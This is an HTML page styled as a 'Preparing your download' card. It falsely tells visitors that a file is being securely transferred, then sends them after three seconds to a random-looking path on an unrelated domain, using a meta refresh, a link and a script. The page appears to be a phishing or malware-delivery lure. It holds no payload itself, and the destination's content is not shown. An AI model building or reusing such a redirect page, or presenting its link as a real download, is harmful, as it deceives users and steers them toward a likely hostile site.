<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Preparing Download</title>

  <!-- Auto redirect -->
  <meta http-equiv="refresh" content="3; url=https://cadena.theartofsimplicity.de/lIucJ/">

  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #f6f7f9;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      color: #111;
    }
    .card {
      background: #fff;
      padding: 40px 36px;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
      text-align: center;
      width: 320px;
    }
    .title {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    .subtitle {
      font-size: 14px;
      color: #555;
      margin-bottom: 24px;
    }
    .loader {
      width: 36px;
      height: 36px;
      border: 3px solid #e5e7eb;
      border-top: 3px solid #2563eb;
      border-radius: 50%;
      margin: 0 auto 20px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .link {
      font-size: 13px;
      color: #2563eb;
      text-decoration: none;
    }
    .link:hover {
      text-decoration: underline;
    }
    .footer {
      margin-top: 18px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="title">Preparing your download</div>
    <div class="subtitle">Your file is being securely transferred</div>

    <div class="loader"></div>

    <a class="link" href="https://cadena.theartofsimplicity.de/lIucJ/">
      Click here if you are not redirected
    </a>

    <div class="footer">
      Please do not refresh this page
    </div>
  </div>

  <script>
    setTimeout(function () {
      window.location.href = "https://cadena.theartofsimplicity.de/lIucJ/";
    }, 3000);
  </script>
</body>
</html>
